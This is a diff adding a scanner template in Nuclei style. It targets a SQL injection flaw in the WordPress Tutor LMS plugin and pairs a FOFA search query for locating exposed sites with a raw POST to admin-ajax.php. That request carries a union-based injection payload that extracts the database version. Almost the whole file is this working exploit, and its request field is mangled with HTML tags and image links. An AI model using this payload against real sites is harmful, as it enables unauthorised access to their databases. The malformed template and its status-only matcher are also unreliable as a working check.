@@ -1,0 +1,32 @@
+id: poc-kxvhcgfgtcv5ku0y
+info:
+  name: Wordpress Tutor LMS插件插件存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kxvhcgfgtcv5ku0y'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kxvhcgfgtcv5ku0y
+    fofa: body="/wp-content/plugins/tutor/"
+http:
+- raw:
+  - '<font style="color:rgb(51, 51, 51);">查看源码，查看tutor_nonce</font>
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790733555-a17c9209-b253-4d19-b88d-3474c86f5217.png)
+
+    POST /wp-admin/admin-ajax.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    action=load_filtered_instructor&_tutor_nonce=573ec53d39&rating_filter=1e0+and+1=0+Union+select+1,2,3,4,5,6,7,8,9,concat(0x7e,version(),0x7e),11,12,14--+-
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790733710-13e51c58-2c17-420a-a297-8c8244cf0f79.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
